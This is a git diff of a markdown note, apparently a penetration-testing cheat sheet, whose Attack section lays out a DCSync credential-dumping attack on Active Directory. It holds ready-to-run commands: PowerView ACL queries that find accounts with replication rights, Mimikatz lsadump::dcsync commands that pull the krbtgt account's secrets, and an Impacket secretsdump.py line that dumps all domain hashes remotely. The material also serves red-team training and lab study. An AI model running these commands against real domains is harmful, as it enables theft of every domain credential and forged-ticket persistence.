@@ -13,14 +13,23 @@ The only pre-requisite to worry about is that you have an account with **rights*
 ## Attack
 
 ```powershell
+'''
+WINDOWS - locally
+'''
 # check privileges
 Get-ObjectAcl -DistinguishedName "dc=fcorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
+# or
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 
-# if OK :
-# lsadump::dcsync /domain:[YOUR DOMAIN ALTOUGH NOT NECESSARY] /user:[ANY USER WHOS PASSWORD DETAILS YOU WANT]
-# FOR EXAMPLE:
+# if OK, mimikatz :
 lsadump::dcsync /domain:fcorp.local /user:krbtgt
-
+# or
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 # note : the user that has dcsync priv
+
+'''
+LINUX - remotely
+'''
+# user with dcsync
+secretsdump.py -just-dc $user:$passwd@$ip -outputfile dcsync_hashes
 ```
